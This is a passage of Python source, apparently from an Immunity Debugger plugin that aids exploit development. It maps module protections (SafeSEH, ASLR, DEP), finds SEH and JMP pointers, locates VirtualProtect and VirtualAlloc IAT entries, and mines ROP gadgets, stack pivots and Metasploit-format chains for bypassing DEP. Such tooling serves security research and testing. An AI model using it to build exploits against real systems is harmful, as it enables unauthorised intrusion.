							if not thismod.moduleKey in modulestoquery and not thismod.isExcluded:
								modulestoquery.append(thismod.moduleKey)
					#startswith ?
					if modulename[len(modulename)-1] == "*":
						if (modulenamewithout == thismodkey[0:len(modulenamewithout)] and not thismod.isExcluded):
							if not thismod.moduleKey in modulestoquery:
								modulestoquery.append(thismod.moduleKey)
					#contains ?
					if ((modulename[0] == "*" and modulename[len(modulename)-1] == "*") or (modulename.find("*") == -1)) and not thismod.isExcluded:
						if thismodkey.find(modulenamewithout) > -1:
							if not thismod.moduleKey in modulestoquery:
								modulestoquery.append(thismod.moduleKey)

		if included:
			modulestoquery.append(thismod.moduleKey)		
	return modulestoquery	
	
	
	
def getPointerAccess(address):
	"""
	Returns access level of specified address, in human readable format
	
	Arguments:
	address - integer value
	
	Return:
	Access level (human readable format)
	"""
	paccess = ""
	try:
		page   = imm.getMemoryPageByAddress( address )
		paccess = page.getAccess( human = True )
	except:
		paccess = ""
	return paccess


def getModuleProperty(modname,parameter):
	"""
	Returns value of a given module property
	Argument : 
	modname - module name
	parameter name - (see populateModuleInfo())
	
	Returns : 
	value associcated with the given parameter / module combination
	
	"""
	modname=modname.strip()
	parameter=parameter.lower()
	modnamelower=modname.lower()
	valtoreturn=""
	nroftimes = 0
	# try case sensitive first
	for thismodule,modproperties in g_modules.iteritems():
		if thismodule.strip() == modname:
			return modproperties[parameter]
	return valtoreturn


def populateModuleInfo():
	"""
	Populate global dictionary with information about all loaded modules
	
	Return:
	Dictionary
	"""
	if not silent:
		imm.setStatusBar("Getting modules info...")
		imm.log("[+] Generating module info table, hang on...")
		imm.log("    - Processing modules")
		imm.updateLog()
	global g_modules
	g_modules={}
	allmodules=imm.getAllModules()
	curmod = ""
	for key in allmodules.keys():
		modinfo={}
		thismod = MnModule(key)
		modinfo["path"]		= thismod.modulePath
		modinfo["base"] 	= thismod.moduleBase
		modinfo["size"] 	= thismod.moduleSize
		modinfo["top"]  	= thismod.moduleTop
		modinfo["safeseh"]	= thismod.isSafeSEH
		modinfo["aslr"]		= thismod.isAslr
		modinfo["nx"]		= thismod.isNX
		modinfo["rebase"]	= thismod.isRebase
		modinfo["version"]	= thismod.moduleVersion
		modinfo["os"]		= thismod.isOS
		modinfo["name"]		= key
		g_modules[thismod.moduleKey] = modinfo
	if not silent:
		imm.log("    - Done. Let's rock 'n roll.")
		imm.setStatusBar("")	
		imm.updateLog()

def ModInfoCached(modulename):
	"""
	Check if the information about a given module is already cached in the global Dictionary
	
	Arguments:
	modulename -  name of the module to check
	
	Return:
	Boolean - True if the module info is cached
	"""
	if (getModuleProperty(modulename,"base") == ""):
		return False
	else:
		return True

def showModuleTable(logfile="", modules=[]):
	"""
	Shows table with all loaded modules and their properties.

	Arguments :
	empty string - output will be sent to log window
	or
	filename - output will be written to the filename
	
	modules - dictionary with modules to query - result of a populateModuleInfo() call
	"""	
	thistable = ""
	if len(g_modules) == 0:
		populateModuleInfo()
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	thistable += " Module info :\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	thistable += " Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"

	for thismodule,modproperties in g_modules.iteritems():
		if (len(modules) > 0 and modproperties["name"] in modules or len(logfile)>0):
			rebase	= toSize(str(modproperties["rebase"]),7)
			base 	= toSize(str("0x" + toHex(modproperties["base"])),10)
			top 	= toSize(str("0x" + toHex(modproperties["top"])),10)
			size 	= toSize(str("0x" + toHex(modproperties["size"])),10)
			safeseh = toSize(str(modproperties["safeseh"]),7)
			aslr 	= toSize(str(modproperties["aslr"]),5)
			nx 		= toSize(str(modproperties["nx"]),7)
			isos 	= toSize(str(modproperties["os"]),7)
			version = str(modproperties["version"])
			path 	= str(modproperties["path"])
			name	= str(modproperties["name"])
			thistable += " " + base + " | " + top + " | " + size + " | " + rebase +"| " +safeseh + " | " + aslr + " |  " + nx + " | " + isos + "| " + version + " [" + name + "] (" + path + ")\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	tableinfo = thistable.split('\n')
	if logfile == "":
		for tline in tableinfo:
			imm.log(tline)
	else:
		FILE=open(logfile,"a")
		FILE.writelines(thistable)
		FILE.close()
		
#-----------------------------------------------------------------------#
# This is where the action is
#-----------------------------------------------------------------------#	

def processResults(all_opcodes,logfile,thislog):
	"""
	Write the output of a search operation to log file

	Arguments:
	all_opcodes - dictionary containing the results of a search 
	logfile - the MnLog object
	thislog - the filename to write to

	Return:
	written content in log file
	first 20 pointers are shown in the log window
	"""
	ptrcnt = 0
	cnt = 0
	
	global silent
	
	if all_opcodes:
		imm.log("[+] Writing results to %s" % thislog)
		for hf in all_opcodes:
			if not silent:
				try:
					imm.log("    - Number of pointers of type '%s' : %d " % (hf,len(all_opcodes[hf])))
				except:
					imm.log("    - Number of pointers of type '<unable to display>' : %d " % (len(all_opcodes[hf])))
		if not silent:
			imm.log("[+] Results : ")
		for optext,pointers in all_opcodes.iteritems():
			for ptr in pointers:
				ptrx = MnPointer(ptr)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				ptrextra = ""
				rva=0
				if (modinfo.isRebase or modinfo.isAslr) and modname != "":
					rva = ptr - modinfo.moduleBase
					ptrextra = " (b+0x" + toHex(rva)+") "
				ptrinfo = "0x" + toHex(ptr) + ptrextra + " : " + optext + " | " + ptrx.__str__() + " " + modinfo.__str__()
				if modname == "":
					if ptrx.isOnStack():
						ptrinfo += " [Stack] "
					elif ptrx.isInHeap():
						ptrinfo += " [Heap] "
				logfile.write(ptrinfo,thislog)
				if (ptr_to_get > -1) or (cnt < 20):
					if not silent:
						imm.log("  %s" % ptrinfo,address=ptr)
					cnt += 1
				ptrcnt += 1
		if cnt < ptrcnt:
			if not silent:
				imm.log("... Only the first %d pointers are shown here. For more pointers, open %s..." % (cnt,thislog)) 
	imm.log("Done. Found %d pointers" % ptrcnt, highlight=1)
	imm.setStatusBar("Done. Found %d pointers" % ptrcnt)
	
	
def mergeOpcodes(all_opcodes,found_opcodes):
	"""
	merges two dictionaries together

	Arguments:
	all_opcodes - the target dictionary
	found_opcodes - the source dictionary

	Return:
	Dictionary (merged dictionaries)
	"""
	if found_opcodes:
		for hf in found_opcodes:
			if hf in all_opcodes:
				all_opcodes[hf] += found_opcodes[hf]
			else:
				all_opcodes[hf] = found_opcodes[hf]
	return all_opcodes

	
def findSEH(modulecriteria={},criteria={}):
	"""
	Performs a search for pointers to gain code execution in a SEH overwrite exploit

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr, rebase and safeseh protected modules
	criteria - dictionary with criteria the pointers need to comply with.

	Return:
	Dictionary (pointers)
	"""
	type = ""
	if "rop" in criteria:
		type = "rop"
	search = getSearchSequences("seh",0,type) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		imm.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
	for thismodule in modulestosearch:
		if not silent:
			imm.log("    - Querying module %s" % thismodule)
		imm.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	#search outside modules
	if "all" in criteria:
		if criteria["all"]:
			rangestosearch = getRangesOutsideModules()
			if not silent:
				imm.log("[+] Querying memory outside modules")
			for thisrange in rangestosearch:
				found_opcodes = searchInRange(search, thisrange[0], thisrange[1],criteria)
				all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
			if not silent:
				imm.log("    - Search complete, processing results")
			imm.updateLog()
	return all_opcodes
	

def findJMP(modulecriteria={},criteria={},register="esp"):
	"""
	Performs a search for pointers to jump to a given register

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	register - the register to jump to

	Return:
	Dictionary (pointers)
	"""
	search = getSearchSequences("jmp",register,"",criteria) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		imm.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
	for thismodule in modulestosearch:
		if not silent:
			imm.log("    - Querying module %s" % thismodule)
		imm.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	if not silent:
		imm.log("    - Search complete, processing results")
	imm.updateLog()
	return all_opcodes	


	
def findROPFUNC(modulecriteria={},criteria={}):
	"""
	Performs a search for pointers to pointers to interesting functions to facilitate a ROP exploit

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.

	Return:
	Dictionary (pointers)
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	ropfuncs = {}
	funccallresults = []
	ropfuncoffsets = {}
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	functionnames = ["virtualprotect","virtualalloc","heapalloc","winexec","setprocessdeppolicy","heapcreate","setinformationprocess","writeprocessmemory","memcpy","memmove","strncpy","createmutex","getlasterror","strcpy","loadlibrary","freelibrary","getmodulehandle","getprocaddress"]
	if not silent:
		imm.log("[+] Looking for pointers to interesting functions...")
	curmod = ""
	results = 0
	#ropfuncfilename="ropfunc.txt"
	#objropfuncfile = MnLog(ropfuncfilename)
	#ropfuncfile = objropfuncfile.reset()
	
	offsets = {}
	
	offsets["kernel32.dll"] = ["virtualprotect","virtualalloc","writeprocessmemory"]
	
	offsetpointers = {}
	
	# populate absolute pointers
	
	for themod in offsets:
		functionnames = offsets[themod]
		themodule = MnModule(themod)
		allfuncs = themodule.getEAT()
		for fn in allfuncs:
			for fname in functionnames:
				if allfuncs[fn].lower().find(fname.lower()) > -1:
					fname = allfuncs[fn].lower()
					if not fname in offsetpointers:
						offsetpointers[fname] = fn
					break

	isrebased = False
	for key in modulestosearch:
		curmod = imm.getModule(key)
		#is this module going to get rebase ?
		themodule = MnModule(key)
		isrebased = themodule.isRebase
		if not silent:
			imm.log("     - Querying %s" % (key))		
		allfuncs = themodule.getIAT()
		imm.updateLog()
		for fn in allfuncs:
			thisfuncname = allfuncs[fn].lower()
			thisfuncfullname = thisfuncname
			if not meetsCriteria(MnPointer(fn), criteria):
				continue
			ptr = 0
			try:
				ptr=struct.unpack('<L',imm.readMemory(fn,4))[0]
			except:
				pass
			if ptr != 0:
				# get offset to one of the offset functions
				# where does pointer belong to ?
				pmodname = MnPointer(ptr).belongsTo()
				if pmodname != "":
					if pmodname.lower() in offsets:
						# find distance to each of the interesting functions in this module
						for interestingfunc in offsets[pmodname.lower()]:
							if interestingfunc in offsetpointers:
								offsetvalue = offsetpointers[interestingfunc] - ptr
								operator = ""
								if offsetvalue < 0:
									operator = "-"
								offsetvaluehex = toHex(offsetvalue).replace("-","")
								thetype = "(%s - IAT 0x%s : %s.%s (0x%s), offset to %s.%s (0x%s) : %d (%s0x%s)" % (key,toHex(fn),pmodname,thisfuncfullname,toHex(ptr),pmodname,interestingfunc,toHex(offsetpointers[interestingfunc]),offsetvalue,operator,offsetvaluehex)
								if not thetype in ropfuncoffsets:
									ropfuncoffsets[thetype] = [fn]
				
				# see if it's a function we are looking for
				for funcsearch in functionnames:
					funcsearch = funcsearch.lower()
					if thisfuncname.find(funcsearch) > -1:
						extra = ""
						extrafunc = ""
						if isrebased:
							extra = " [Warning : module is likely to get rebased !]"
							extrafunc = "-rebased"
						if not silent:
							imm.log("       0x%s : ptr to %s (0x%s) (%s) %s" % (toHex(fn),thisfuncname,toHex(ptr),key,extra))
						logtxt = thisfuncfullname.lower().strip()+extrafunc+" | 0x" + toHex(ptr)
						if logtxt in ropfuncs:
								ropfuncs[logtxt] += [fn]
						else:
								ropfuncs[logtxt] = [fn]
						results += 1
						ptr_counter += 1
						if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
							ropfuncs,ropfuncoffsets
	return ropfuncs,ropfuncoffsets

def assemble(instructions,encoder=""):
	"""
	Assembles one or more instructions to opcodes

	Arguments:
	instructions = the instructions to assemble (separated by #)

	Return:
	Dictionary (pointers)
	"""
	if not silent:
		imm.log("Opcode results : ")
		imm.log("---------------- ")
	cnt=1
	cmdInput=""
	allopcodes=""
	encodecmd=""
	encodebad=""
	curpos=0
	
	instructions = instructions.replace('"',"").replace("'","")

	splitter=re.compile('#')
	instructions=splitter.split(instructions)
	for instruct in instructions:
		try:
			instruct = instruct.strip()
			assembled=imm.assemble(instruct)
			strAssembled=""
			for assemOpc in assembled:
				if (len(hex(ord(assemOpc)))) == 3:
					subAssembled = "\\x0"+hex(ord(assemOpc)).replace('0x','')
					strAssembled = strAssembled+subAssembled
				else:
					strAssembled =  strAssembled+hex(ord(assemOpc)).replace('0x', '\\x')
			if len(strAssembled) < 30:
				if not silent:
					imm.log(" %s = %s" % (instruct,strAssembled))
				allopcodes=allopcodes+strAssembled
			else:
				if not silent:
					imm.log(" %s => Unable to assemble this instruction !" % instruct,highlight=1)
		except:
			if not silent:
				imm.log("   Could not assemble %s " % instruct)
			pass
	if not silent:
		imm.log(" Full opcode : %s " % allopcodes)
	return allopcodes
	# if (encoder == "ascii"):
		# imm.log("Encoding to ASCII...")
		# imm.log("")
		# encodeargs=[]
		# encodeargs.append("doencode")
		# encodeargs.append(encodecmd)
		# encodeargs.append(allopcodes.replace('\\x',''))
		# encodeargs.append(encodebad)
		# doencode(encodeargs)
	
	
def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5,split=False,pivotdistance=0,fast=False,mode="all"):
	"""
	Searches for rop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	endings - array with all rop gadget endings to look for. Default : RETN and RETN+offsets
	maxoffset - maximum offset value for RETN if endings are set to RETN
	depth - maximum number of instructions to go back
	split - Boolean that indicates whether routine should write all gadgets to one file, or split per module
	pivotdistance - minimum distance a stackpivot needs to be
	fast - Boolean indicating if you want to process less obvious gadgets as well
	mode - internal use only
	
	Return:
	Output is written to files, containing rop gadgets, suggestions, stack pivots and virtualprotect/virtualalloc routine (if possible)
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0

	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=toHex(imm.getDebuggedPid())
	progressfilename="_rop_progress_"+imm.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset()

	imm.log("[+] Progress will be written to %s" % progressfilename)
	imm.log("[+] Maximum offset : %d" % maxoffset)
	imm.log("[+] (Minimum/optional maximum) stackpivot distance : %s" % str(pivotdistance))
	imm.log("[+] Max nr of instructions : %d" % depth)
	imm.log("[+] Split output into module rop files ? %s" % split)

	fcnt = 0
	filesok = 0
	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	
	if "f" in criteria:
		if criteria["f"] <> "":
			if type(criteria["f"]).__name__.lower() != "bool":		
				rawfilenames = criteria["f"].replace('"',"")
				allfiles = rawfilenames.split(',')
				#check if files exist
				imm.log("[+] Attempting to use %d rop file(s) as input" % len(allfiles))				
				while fcnt < len(allfiles):
					allfiles[fcnt]=allfiles[fcnt].strip()
					if not os.path.exists(allfiles[fcnt]):
						imm.log("     ** %s : Does not exist !" % allfiles[fcnt],highlight=1)
					else:
						filestouse.append(allfiles[fcnt])
					fcnt=fcnt+1	
				usefiles = True
		
	if usefiles and len(filestouse) == 0:
		imm.log(" ** Unable to find any of the source files, aborting... **",highlight=1)
		return
		
	search = []
	
	if not usefiles:
		if len(endings) == 0:
			#RETN only
			offsetcnt = 0
			search.append("RETN")
			while offsetcnt <= maxoffset:
				search.append("RETN "+ toHexByte(offsetcnt))
				offsetcnt += 2
		else:
			for ending in endings:
				imm.log("[+] Custom ending : %s" % ending)
				if ending != "":
					search.append(ending)
		imm.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
		for thismodule in modulestosearch:
			imm.log("    - Querying module %s" % thismodule)
			imm.updateLog()
			#search
			found_opcodes = searchInModule(search,thismodule,criteria)
			#merge results
			all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
		imm.log("    - Search complete :")
	else:
		imm.log("[+] Reading input files")
		for filename in filestouse:
			imm.log("     - Reading %s" % filename)
			all_opcodes = mergeOpcodes(all_opcodes,readGadgetsFromFile(filename))
			
	imm.updateLog()
	tp = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				imm.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
				tp = tp + len(all_opcodes[endingtype]) / 2
			else:
				imm.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])
	global silent
	if not usefiles:		
		imm.log("    - Filtering and mutating %d gadgets" % tp)
	else:
		imm.log("    - Categorizing %d gadgets" % tp)
		silent = True
		
	imm.updateLog()
	ropgadgets = {}
	interestinggadgets = {}
	stackpivots = {}
	stackpivots_safeseh = {}
	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	dict_thisgadget = {}
	dict_thisinterestinggadget = {}	
	gadgetcounter = 0
	interestinggadgetcounter = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt=adcnt+1
				if usefiles:
					adcnt = adcnt - 0.5
				if adcnt > (tc*1000):
					thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
					updatetext = "      - Progress update : " + str(tc*1000) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*1000*100)/tp)+"%)"
					objprogressfile.write(updatetext.strip(),progressfile)
					imm.log(updatetext)
					imm.updateLog()
					tc=tc+1				
				if not usefiles:
					#first get max backward instruction
					thisopcode = imm.disasmBackward(endingtypeptr,depth+1)
					thisptr = thisopcode.getAddress()
					# we now have a range to mine
					startptr = thisptr
					currentmodulename = MnPointer(thisptr).belongsTo()
					modinfo = MnModule(currentmodulename)
					issafeseh = modinfo.isSafeSEH
					while startptr <= endingtypeptr:
						# get the entire chain from startptr to endingtypeptr
						thischain = ""
						msfchain = []
						thisopcodebytes = ""
						chainptr = startptr
						if isGoodGadgetPtr(startptr,criteria) and not startptr in ropgadgets and not startptr in interestinggadgets:
							invalidinstr = False
							while chainptr < endingtypeptr and not invalidinstr:
								thisopcode = imm.disasm(chainptr)
								thisinstruction = thisopcode.getDisasm()
								if isGoodGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):						
									thischain =  thischain + " # " + thisinstruction
									msfchain.append([chainptr,thisinstruction])
									thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
									chainptr = imm.disasmForwardAddressOnly(chainptr,1)
								else:
									invalidinstr = True						
							if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
								fullchain = thischain + " # " + endingtype
								msfchain.append([endingtypeptr,endingtype])
								thisopcode = imm.disasm(endingtypeptr)
								thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
								msfchain.append(["raw",thisopcodebytes])
								if isInterestingGadget(fullchain):
									interestinggadgets[startptr] = fullchain
									if not startptr in dict_thisinterestinggadget:
										dict_thisinterestinggadget[startptr] = msfchain
									#this may be a good stackpivot too
									stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance) 
									if stackpivotdistance > 0:
										#safeseh or not ?
										if issafeseh:
											if not stackpivotdistance in stackpivots_safeseh:
												stackpivots_safeseh.setdefault(stackpivotdistance,[[startptr,fullchain]])
											else:
												stackpivots_safeseh[stackpivotdistance] += [[startptr,fullchain]]
										else:
											if not stackpivotdistance in stackpivots:
												stackpivots.setdefault(stackpivotdistance,[[startptr,fullchain]])
											else:
												stackpivots[stackpivotdistance] += [[startptr,fullchain]]								
								else:
									if not fast:
										ropgadgets[startptr] = fullchain
										if not startptr in dict_thisgadget:
											dict_thisgadget[startptr] = msfchain
						startptr = startptr+1
						
				else:
					if step == 0:
						startptr = endingtypeptr
					if step == 1:
						thischain = endingtypeptr
						chainptr = startptr
						ptrx = MnPointer(chainptr)
						modname = ptrx.belongsTo()
						issafeseh = False
						if modname != "":
							thism = MnModule(modname)
							issafeseh = thism.isSafeSEH
						if isGoodGadgetPtr(startptr,criteria) and not startptr in ropgadgets and not startptr in interestinggadgets:
							fullchain = thischain
							if isInterestingGadget(fullchain):
								interestinggadgets[startptr] = fullchain
								#this may be a good stackpivot too
								stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance) 
								if stackpivotdistance > 0:
									#safeseh or not ?
									if issafeseh:
										if not stackpivotdistance in stackpivots_safeseh:
											stackpivots_safeseh.setdefault(stackpivotdistance,[[startptr,fullchain]])
										else:
											stackpivots_safeseh[stackpivotdistance] += [[startptr,fullchain]]
									else:
										if not stackpivotdistance in stackpivots:
											stackpivots.setdefault(stackpivotdistance,[[startptr,fullchain]])
										else:
											stackpivots[stackpivotdistance] += [[startptr,fullchain]]	
							else:
								if not fast:
									ropgadgets[startptr] = fullchain
						step = -1
					step += 1
	
	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	updatetext = "      - Progress update : " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	imm.log(updatetext)
	imm.updateLog()
	
	if mode == "all":
		# another round of filtering
		updatetext = "Creating suggestions list"
		objprogressfile.write(updatetext.strip(),progressfile)
		suggestions = getRopSuggestion(interestinggadgets,ropgadgets)
		#see if we can propose something
		updatetext = "Processing suggestions"
		objprogressfile.write(updatetext.strip(),progressfile)
		suggtowrite=""
		for suggestedtype in suggestions:
			if suggestedtype.find("pop") == -1:		#too many
				suggtowrite += "[" + suggestedtype + "]\n"
				for suggestedpointer in suggestions[suggestedtype]:
					sptr = MnPointer(suggestedpointer)
					modname = sptr.belongsTo()
					modinfo = MnModule(modname)
					rva = suggestedpointer - modinfo.moduleBase	
					suggesteddata = suggestions[suggestedtype][suggestedpointer]
					ptrinfo = "0x" + toHex(suggestedpointer) + " (RVA : 0x" + toHex(rva) + ") : " + suggesteddata + "    ** " + modinfo.__str__() + " **   |  " + sptr.__str__()+"\n"
					suggtowrite += ptrinfo
		
		updatetext = "Generating rop chain proposal if possible"
		objprogressfile.write(updatetext.strip(),progressfile)
		vplogtxt = ""
		vplogtxt = createRopChains(suggestions,interestinggadgets,ropgadgets,modulecriteria,criteria)
		imm.logLines(vplogtxt.replace("\t","    "))
	
	#done, write to log files
	imm.setStatusBar("Writing to logfiles...")
	imm.log("")
	logfile = MnLog("stackpivot.txt")
	thislog = logfile.reset()
	objprogressfile.write("Sorting stackpivots",progressfile)
	
	stackpivots_safeseh_index = []
	for spivdis in stackpivots_safeseh:
		stackpivots_safeseh_index.append(spivdis)
	stackpivots_safeseh_index.sort()
	
	stackpivots_index = []
	for spivdis in stackpivots:
		stackpivots_index.append(spivdis)
	stackpivots_index.sort()
	
	objprogressfile.write("Writing " + str(len(stackpivots)+len(stackpivots_safeseh))+" stackpivots with minimum offset " + str(pivotdistance)+" to file " + thislog,progressfile)
	imm.log("")
	imm.log("[+] Writing stackpivots to file " + thislog)
	logfile.write("Stack pivots, minimum distance " + str(pivotdistance),thislog)
	logfile.write("-------------------------------------",thislog)
	logfile.write("Non-safeSEH protected pivots :",thislog)
	logfile.write("------------------------------",thislog)
	arrtowrite = ""	
	pivcnt = 0
	try:
		FILE=open(thislog,"a")
		for sdist in stackpivots_index:
			for spivot,schain in stackpivots[sdist]:
				ptrx = MnPointer(spivot)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + "} : " + schain + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				pivcnt += 1
				arrtowrite += ptrinfo
		FILE.writelines(arrtowrite)
		FILE.close()
	except:
		pass
	logfile.write("SafeSEH protected pivots :",thislog)
	logfile.write("--------------------------",thislog)	
	arrtowrite = ""	
	try:
		FILE=open(thislog,"a")
		for sdist in stackpivots_safeseh_index:
			for spivot,schain in stackpivots_safeseh[sdist]:
				ptrx = MnPointer(spivot)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + "} : " + schain + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				pivcnt += 1
				arrtowrite += ptrinfo
		FILE.writelines(arrtowrite)
		FILE.close()
	except:
		pass	
	imm.log("    Wrote %d pivots to file " % pivcnt)
	arrtowrite = ""
	if mode == "all":
		if len(suggestions) > 0:
			logfile = MnLog("rop_suggestions.txt")
			thislog = logfile.reset()
			objprogressfile.write("Writing all suggestions to file "+thislog,progressfile)
			imm.log("[+] Writing suggestions to file " + thislog )
			logfile.write("Suggestions",thislog)
			logfile.write("-----------",thislog)
			FILE=open(thislog,"a")
			FILE.writelines(suggtowrite)
			FILE.write("\n")
			FILE.close()
		if not split:
			logfile = MnLog("rop.txt")
			thislog = logfile.reset()
			objprogressfile.write("Gathering interesting gadgets",progressfile)
			imm.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
			logfile.write("Interesting gadgets",thislog)
			logfile.write("-------------------",thislog)
			imm.updateLog()
			try:
				FILE=open(thislog,"a")
				for gadget in interestinggadgets:
						ptrx = MnPointer(gadget)
						modname = ptrx.belongsTo()
						modinfo = MnModule(modname)
						ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
						arrtowrite += ptrinfo
				objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
				FILE.writelines(arrtowrite)
				FILE.close()
			except:
				pass
			arrtowrite=""
			if not fast:
				objprogressfile.write("Enumerating other gadgets (" + str(len(ropgadgets))+")",progressfile)
				try:
					logfile.write("",thislog)
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
					FILE=open(thislog,"a")
					for gadget in ropgadgets:
							ptrx = MnPointer(gadget)
							modname = ptrx.belongsTo()
							modinfo = MnModule(modname)
							ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
							arrtowrite += ptrinfo
					objprogressfile.write("Writing results to file " + thislog + " (" + str(len(ropgadgets))+" other gadgets)",progressfile)
					FILE.writelines(arrtowrite)
					FILE.close()
				except:
					pass
			
			# create msf compatible file
			logfile = MnLog("msfrop.txt")
			global noheader
			noheader = True
			thislog = logfile.reset()
			noheader = False
			outputstr = ""
			FILE=open(thislog,"w")			
			for dictptr in dict_thisinterestinggadget:
				nr_of_entries = len(dict_thisinterestinggadget[dictptr])
				linecnt = 1
				chainstr = ""
				rawstr = ""
				thisptr = MnPointer(dictptr)
				modname = thisptr.belongsTo()
				modinfo = MnModule(modname)		
				thismodversion = getModuleProperty(modname,"version")
				base = getModuleProperty(modname,"base")
				
				protectstr = ""
				if modinfo.isAslr:
					protectstr += "ASLR,"
				if modinfo.isRebase:
					protectstr += "REBASED,"
				if modinfo.isSafeSEH:
					protectstr += "SAFESEH,"
				if modinfo.isNX:
					protectstr += "DEP,"
				if modinfo.isOS:
					protectstr += "OS,"
				
				protectstr = protectstr.rstrip(",")
				
				for lines in dict_thisinterestinggadget[dictptr]:
					if linecnt < nr_of_entries:
						rva = lines[0] - base
						chainstr += "[addr: 0x" + toHex(lines[0]) + "][RVA: 0x" + toHex(rva)+"]\t" + lines[1] + "\n"
					else:
						rawstr="[raw: " + lines[1].replace("\\x"," ")+"]\n"
					linecnt += 1
				outputstr += "[mod: " + modname +"][ver: " + thismodversion + "][VA: 0x" + toHex(base)+"]\n"
				outputstr += "[protect: " + protectstr +"]\n"
				outputstr += "[properties: " + thisptr.__str__()+"]\n"
				outputstr += rawstr
				outputstr += chainstr.lower()
				outputstr += "\n"
			FILE.write(outputstr)
			FILE.close()
			
		else:
			imm.log("[+] Writing results to individual files (grouped by module)")
			imm.updateLog()
			for thismodule in modulestosearch:
				thismodname = thismodule.replace(" ","_")
				thismodversion = getModuleProperty(thismodule,"version")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset()
				logfile.write("Interesting gadgets",thislog)
				logfile.write("-------------------",thislog)
			for gadget in interestinggadgets:
				ptrx = MnPointer(gadget)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				thismodversion = getModuleProperty(modname,"version")
				thismodname = modname.replace(" ","_")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset(False)
				ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				FILE=open(thislog,"a")
				FILE.write(ptrinfo)
				FILE.close()
			if not fast:
				for thismodule in modulestosearch:
					thismodname = thismodule.replace(" ","_")
					thismodversion = getModuleProperty(thismodule,"version")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
				for gadget in ropgadgets:
					ptrx = MnPointer(gadget)
					modname = ptrx.belongsTo()
